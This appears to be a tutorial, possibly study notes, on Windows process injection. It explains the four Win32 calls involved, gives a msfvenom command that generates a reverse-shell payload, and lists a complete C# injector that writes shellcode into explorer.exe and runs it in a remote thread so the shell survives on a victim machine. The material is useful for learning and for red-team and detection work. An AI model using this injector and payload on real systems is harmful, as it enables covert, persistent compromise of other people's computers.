# Process Injection

Whenever we'll get a reverse shell, it's mostly is spawned by creating a new seperate process, if that process gets killed, could be because of the target machine or the victim may kill the process by closing the application our reverse shell will die

So this is where the technique of **Process Injection** comes in, where we inject our shell code in any of the process which may run until the target machine gets turned off (i.e explorer.exe)

A basic process injection can be performed with 4 windows API calls which are
- OpenProcess
- VirtualAllocEX
- WriteProcessMemory
- CreateRemoteThread

This is also known as Vanilla Process Injection

## OpenProcess

This opens a local process object and returns a handle for it, think the handle like we usually do when working with files

```c++
HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,
  [in] BOOL  bInheritHandle,
  [in] DWORD dwProcessId
);
```
This function takes three parameters

- `dwDesiredAccess` has a 32 bit un-signed interger value and it establishes the access rights, there are hex values we can use for the access , the acess which we can use for all rights on a process is `PROCESS_ALL_ACCESS`  which can be represented in hex  `0x001FFFFF` 

other access values can be seen from this gist  https://gist.github.com/Rhomboid/0cf96d7c82991af44fda or from the official microsoft docs

- `bInheritHandle` it has a boolen value and determines if the returned process handle maybe inehrited by the child process
- `dwProcessID` has a 32 bit un-signed interger value and holds the process ID to be opened

## VirtualAllocEX

VirtualAllocEX is used to allocate memory in the address space of the process, it's different from **VirtualAlloc** as it can allocate memory in any another process

```c++
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```

This function has five parameters
- `hProcess` this is is the handler for the process we obtain from `OpenProcess` function
- `lpAddress` is a pointer (desired address) for the memory location in the process
- `dwSize` is the size of desired location in bytes
- `flAllocationType` this specifies the type of memory allocation which can be `MEM_COMMIT (0x00001000)` , `MEM_RESERV(0x00002000)`, `MEM_RESET(0x00080000)`, and `MEM_RESET_UNDO(0x1000000)` 
- `flProtect`  this specfices the memory protection  which can be set with `PAGE_EXECUTE(0x10)`, `PAGE_EXECUTE_READ(0x20)`, `PAGE_EXECUTE_READWRITE(0x40)`, `PAGE_EXECUTE_WRITECOPY(0x80)`, more values can be found from the documentation 
https://docs.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants

## WriteProcess Memory

This functions writes data into the memory area of process, in simple terms copy data to the remote process

```c++
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
```
This function has 5 parameters

- `hProcess` this is the handler for the the process in which we'll pass the handler from `OpenProcess` function 
- `lpBaseAddress` this is the pointer to the address where the data is written
- `lpBuffer` this is the pointer to the buffer which will contain the data to be written in the memory or address space of the process
- `nSize` this indicates the number of byes to be written , the length of the buffer from lpbuffer
- `*lpNumberOfBytesWritten` this is the pointer to location in memory that receives how many number of bytes were written or copied

## CreateRemoteThread

This function creates remote process threads which runs in address space of another process

```c++
HANDLE CreateRemoteThread(
  [in]  HANDLE                 hProcess,
  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  [in]  SIZE_T                 dwStackSize,
  [in]  LPTHREAD_START_ROUTINE lpStartAddress,
  [in]  LPVOID                 lpParameter,
  [in]  DWORD                  dwCreationFlags,
  [out] LPDWORD                lpThreadId
);
```
This function has 7 parameters

- `hProcess` this is the handler for the process same as in the other functions which will hold the handler for the process we'll have from the `OpenProcess`
- `lpThreadAttributes` this is a pointer to security attributes which will determine security descriptor for the new thread, if the value of this is NULL then it's set to the deafult value which is `0` which the child process can't inherit
https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85)
- `dwStackSize` this specifices the allowed stack (initial) size in bytes, if this is set to 0, the default size for this is going to be used in the new thread
- `lpStartAddress` this is a pointer to the starting address of the thread that is going to be executed which will be the address of our copied buffer
- `lpParameter` this is a pointer to variable which will be passed to thread pointed by lpstartaddress but this can be left NULL if there are no parameters needed
- `dwCreationFlags` this controls the creation of thread which can accepts 3 but we usually set the value to  `0` for running thread immediately after creation the other values that can be set are `CREATE_SUSPENDED(0x00000004)`, this requires the `ResumeThread` function to be called to execute the thread from suspended state and `STACK_SIZE_PARAM_IS_A_RESERVATION(0x00010000)`
- `lpThreadID` this is a pointer to a variable that receives the thread identifier


I will be showing process injection in c# but it could be done with c++ as well, these functions can be used with `Platform Invoke` or` P/Invoke` in short

https://docs.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke

For example if we want to display a message box in c# it would be like this


<img src="https://i.imgur.com/T0Kh1hR.png"/>
Here we are importing`user32.dll` and declaring `Messagebox` as an `extern` (external) function. In comparision to c/c++, it's quite easy to use as it only requires to include `windows.h` , which is a library for the Win32 API

<img src="https://i.imgur.com/VdOSCIA.png"/>
Coming back to importing windows api functions, we can import the four functions which were the discussed at the beginning with `kernel32.dll` and declare those functions as `extern`  also following pinvoke.net with the proper parameters

<img src="https://i.imgur.com/19pNlCa.png"/>

Having the functions decalred we can now use them in the main function 


<img src="https://i.imgur.com/ytL2z2h.png"/>


In Openprocess, with `0x001F0FF` we are giving the access rights on the proces which gives All access on the selected process, these values can be found form here https://www.pinvoke.net/default.aspx/kernel32.openprocess 

<img src="https://i.imgur.com/rWwvjPx.png"/>

Next  we are giving a false value because we don't want it to be inherited by child process (we could if we want to) and in `processId` we are giving the process ID for `explorer.exe` which can be found from Task Manger

<img src="https://i.imgur.com/giY6tFJ.png"/>


<img src="https://i.imgur.com/6vNaomr.png"/>

In `hProcess` we are sending the process handle returned from the openprocess function which is a pointer ,  `IntPtr.Zero` is the pointer of the memory location whose value is `null` so the function will choose itself the desired address for memory allocation

https://stackoverflow.com/questions/33854462/virtualallocex-returns-same-address-when-specifying-different-start-addresses


<img src="https://i.imgur.com/QzAebxz.png"/>


For Size we are providing `0x1000` bytes for the memory size

The `flAllocationType` has the value of `MEM_COMMIT(0x1000)` and `MEM_REVERSE(0x2000)`  which becomes `0x3000`, this can however be written in this format as well `0x1000 | 0x2000`

<img src="https://i.imgur.com/jOSvljT.png"/>


And lastly in `flProtect` we are providing a value of `0x40` which means having `ExecuteReadWrite` access which is `PAGE_EXECUTE_READWRITE` (from the microsoft documetation)

<img src="https://i.imgur.com/gdELghv.png"/>


Generating the shell code for reverse shell with `msfvenom`

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=2222 -f csharp EXITFUNC=thread
```

Here `EXITFUNC=thread` is being used to make the shell code execute in a sub-thread and on exiting the threads results in sucessful execition of the shell code

<img src="https://i.imgur.com/qeeX8uV.png"/>

And generating the shell code copy paste the byte array

<img src="https://i.imgur.com/rXreOJk.png"/>


<img src="https://i.imgur.com/k5OcK6I.png"/>

In `hprocess` we are providing the handle for the process, `addr` has the pointer to the address from VirtualAllocEX function, `buff` has the shell code from the byte array which is generated from `msfvenom` , `buf.Length` is the size of the byte array and `outSize`  is the pointer to location of memory for storing the number of bytes to be written which as been declared before calling this function as it's being passed by reference


<img src="https://i.imgur.com/umHUCPu.png"/>
`hProcess` is the handle of the process, with `IntPtr.zero` the securtiy descriptor of thread is set to default, the stacksize is set to `0` which use the default size for the new thread, `addr` will be the starting address of the newly created thread, ther's no need to any parameters so we are specifing `IntPtr.zero` for null, with `0` we immediately run the thread after being created which is the `CreatinonFlag` parameter and lastly there's no need of thread ID so we can make it null with `IntrPtr.zero`


```c#
using System;
using System.Runtime.InteropServices;

public class Program

{

  // importing kernel32.dll to declare external windows API functions

  [DllImport("kernel32.dll")]
  static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

  [DllImport("kernel32.dll")]
  static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

  [DllImport("kernel32.dll")]
  static extern IntPtr WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

  [DllImport("kernel32.dll")]
  static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

  public static void Main(string[] args)

  {

    IntPtr hProcess = OpenProcess(0x001F0FFF, false, 1092);

    IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

    // shell code

    byte[] buf = new byte[shell code size] {   shell code  };

    IntPtr outSize;

    WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

    IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

  }

}
```

Running the code with `dotnet run`

<img src="https://i.imgur.com/qL5wPsf.png"/>


## References

- https://docs.microsoft.com/en-us/windows/win32/api/
- https://docs.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke
- http://pinvoke.net/
- https://gist.github.com/Rhomboid/0cf96d7c82991af44fda
- https://www.displayfusion.com/Discussions/View/converting-c-data-types-to-c/?ID=38db6001-45e5-41a3-ab39-8004450204b3
- https://stackoverflow.com/questions/1456861/is-intptr-zero-equivalent-to-null
- https://stackoverflow.com/questions/33854462/virtualallocex-returns-same-address-when-specifying-different-start-addresses
